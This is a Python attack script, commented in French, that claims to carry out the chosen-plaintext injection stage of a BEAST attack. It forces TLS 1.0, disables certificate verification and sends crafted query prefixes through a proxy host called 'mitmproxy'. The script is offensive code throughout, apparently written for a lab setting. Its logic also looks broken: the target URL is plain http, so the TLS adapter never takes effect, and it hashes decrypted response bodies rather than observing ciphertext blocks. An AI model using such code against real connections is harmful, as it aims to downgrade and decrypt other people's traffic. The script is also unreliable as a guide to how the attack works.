#!/usr/bin/env python3
# coding: utf-8

import ssl
import requests
import hashlib
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Adapter TLS 1.0 forcé
class TLSv10Adapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        pool_kwargs['ssl_context'] = ctx
        return super().init_poolmanager(connections, maxsize, block, **pool_kwargs)

# Charset à tester
CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def guess_token_position(base_url):
    print("Début de l'injection contrôlée pour alignement BEAST...\n")

    for c in CHARSET:
        prefix = "X" * (15) + c  # 16e octet contrôlé
        url = f"{base_url}?q={prefix}"

        session = requests.Session()
        session.mount("https://", TLSv10Adapter())
        session.proxies = {
            "http": "http://mitmproxy:8080",
            "https": "http://mitmproxy:8080"
        }

        try:
            resp = session.get(url, verify=False)
            digest = hashlib.md5(resp.content).hexdigest()[:8]

            print(f"[?q={prefix}] => HTTP {resp.status_code} | MD5 bloc: {digest}")
        except Exception as e:
            print(f"[!] Erreur pour {prefix} : {e}")

def main():
    # Désactiver les avertissements TLS
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    # URL cible via mitmproxy
    base_url = "http://mitmproxy:8080/"

    # Lancer l'étape d'injection BEAST
    guess_token_position(base_url)

if __name__ == "__main__":
    main()
